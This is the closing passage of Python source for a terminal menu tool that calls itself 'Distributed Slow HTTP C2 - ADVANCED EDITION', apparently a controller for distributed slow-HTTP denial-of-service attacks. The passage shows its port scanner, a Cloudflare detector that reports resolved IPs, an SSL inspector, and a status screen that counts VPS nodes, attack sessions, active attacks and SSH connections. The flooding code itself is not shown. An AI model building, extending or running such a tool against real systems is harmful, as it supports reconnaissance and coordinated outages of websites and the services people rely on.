        print(f"\n{Colors.YELLOW}[INFO] Scanning ports on {target}...{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] This may take some time depending on the port range...{Colors.RESET}")
        
        try:
            results = self.network_tools.scan_ports(target, port_range)
            
            if results['open_ports']:
                print(f"\n{Colors.GREEN}[RESULT] Open ports found:{Colors.RESET}")
                
                # Convert to list of lists for table printing
                headers = ["Port", "Service", "State", "Banner"]
                data = []
                
                for port_info in results['open_ports']:
                    data.append([
                        port_info['port'],
                        port_info['service'] or 'unknown',
                        f"{Colors.GREEN}open{Colors.RESET}",
                        port_info['banner'] or ''
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}[RESULT] No open ports found in the specified range{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}[INFO] Scan completed in {results['scan_time']:.2f} seconds{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in port scanning: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def cloudflare_detector_tool(self):
        """Cloudflare detector tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}CLOUDFLARE DETECTOR TOOL{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        # Remove protocol if present
        if domain.startswith('http'):
            parsed = urlparse(domain)
            domain = parsed.hostname or parsed.netloc
        
        print(f"\n{Colors.YELLOW}[INFO] Detecting Cloudflare protection for {domain}...{Colors.RESET}")
        
        try:
            results = self.network_tools.detect_cloudflare(domain)
            
            if results['is_behind_cloudflare']:
                print(f"\n{Colors.GREEN}[DETECTED] Domain is protected by Cloudflare{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
                for evidence in results['evidence']:
                    print(f"  - {evidence}")
                
                if results['cloudflare_ips']:
                    print(f"\n{Colors.BOLD}CLOUDFLARE IPs:{Colors.RESET}")
                    for ip in results['cloudflare_ips']:
                        print(f"  - {ip}")
                
                if results['direct_ips']:
                    print(f"\n{Colors.BOLD}ALL RESOLVED IPs:{Colors.RESET}")
                    for ip in results['direct_ips']:
                        print(f"  - {ip}")
            else:
                print(f"\n{Colors.YELLOW}[RESULT] Domain does not appear to be behind Cloudflare{Colors.RESET}")
                
                if results['direct_ips']:
                    print(f"\n{Colors.BOLD}RESOLVED IPs:{Colors.RESET}")
                    for ip in results['direct_ips']:
                        print(f"  - {ip}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in Cloudflare detection: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def ssl_info_tool(self):
        """SSL information tool"""
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}SSL INFORMATION TOOL{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target host: ")
        if not target:
            return
        
        # Parse URL if provided
        if target.startswith('http'):
            parsed = urlparse(target)
            target = parsed.hostname or parsed.netloc
        
        port = self.terminal.input_with_prompt("Enter port [443]: ", False) or "443"
        try:
            port = int(port)
        except ValueError:
            print(f"{Colors.RED}Invalid port number{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.YELLOW}[INFO] Getting SSL information for {target}:{port}...{Colors.RESET}")
        
        try:
            results = self.network_tools.get_ssl_info(target, port)
            
            if results['has_ssl']:
                print(f"\n{Colors.GREEN}[SUCCESS] SSL/TLS connection established{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}CERTIFICATE INFORMATION:{Colors.RESET}")
                print(f"Subject: {results['subject']}")
                print(f"Issuer: {results['issuer']}")
                print(f"Version: {results['version']}")
                print(f"Serial Number: {results['serial_number']}")
                print(f"Not Before: {results['not_before']}")
                print(f"Not After: {results['not_after']}")
                
                # Check expiration
                if results['is_expired']:
                    print(f"{Colors.RED}[WARNING] Certificate has expired!{Colors.RESET}")
                else:
                    days_left = results['days_left']
                    if days_left < 30:
                        print(f"{Colors.YELLOW}[WARNING] Certificate expires in {days_left} days{Colors.RESET}")
                    else:
                        print(f"{Colors.GREEN}Certificate valid for {days_left} more days{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}SUPPORTED PROTOCOLS:{Colors.RESET}")
                for protocol, supported in results['protocols'].items():
                    status = f"{Colors.GREEN}Supported{Colors.RESET}" if supported else f"{Colors.RED}Not Supported{Colors.RESET}"
                    print(f"{protocol}: {status}")
                
                print(f"\n{Colors.BOLD}CIPHER SUITES:{Colors.RESET}")
                for cipher in results['cipher_suites'][:5]:  # Show only first 5
                    print(f"  - {cipher}")
                
                if len(results['cipher_suites']) > 5:
                    print(f"  ... and {len(results['cipher_suites']) - 5} more")
                
                # Security assessment
                print(f"\n{Colors.BOLD}SECURITY ASSESSMENT:{Colors.RESET}")
                for check, result in results['security_checks'].items():
                    status = f"{Colors.GREEN}Pass{Colors.RESET}" if result['pass'] else f"{Colors.RED}Fail{Colors.RESET}"
                    print(f"{check}: {status}")
                    if result['message']:
                        print(f"  {result['message']}")
            else:
                print(f"\n{Colors.RED}[ERROR] No SSL/TLS connection available{Colors.RESET}")
                if results['error']:
                    print(f"Error: {results['error']}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error in SSL information: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        """System status menu"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 50)
        
        # Database status
        print(f"{Colors.BOLD}DATABASE:{Colors.RESET}")
        vps_count = len(self.db_manager.get_all_vps())
        attack_count = len(self.db_manager.get_attack_sessions())
        active_attacks = len(self.db_manager.get_active_attack_sessions())
        
        print(f"VPS Nodes: {vps_count}")
        print(f"Attack Sessions: {attack_count}")
        print(f"Active Attacks: {active_attacks}")
        
        # SSH connections
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        connection_count = len(self.ssh_manager.connections)
        print(f"Active Connections: {connection_count}")
        
        if connection_count > 0:
            for ip, conn in self.ssh_manager.connections.items():
                print(f"  - {ip}: {Colors.GREEN}Connected{Colors.RESET}")
        
        # System resources
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            print(f"CPU Usage: {cpu_percent}%")
            print(f"Memory Usage: {memory.percent}% ({self._format_bytes(memory.used)}/{self._format_bytes(memory.total)})")
            print(f"Disk Usage: {disk.percent}% ({self._format_bytes(disk.used)}/{self._format_bytes(disk.total)})")
        
        # Network interfaces
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}NETWORK INTERFACES:{Colors.RESET}")
            net_io = psutil.net_io_counters(pernic=True)
            
            for interface, stats in net_io.items():
                print(f"{interface}:")
                print(f"  Sent: {self._format_bytes(stats.bytes_sent)}")
                print(f"  Received: {self._format_bytes(stats.bytes_recv)}")
        
        input("\nPress Enter to continue...")

def main():
    """Main function to run the application"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - ADVANCED EDITION...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        logger.critical(f"Fatal error: {str(e)}")
        logger.critical(traceback.format_exc())
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
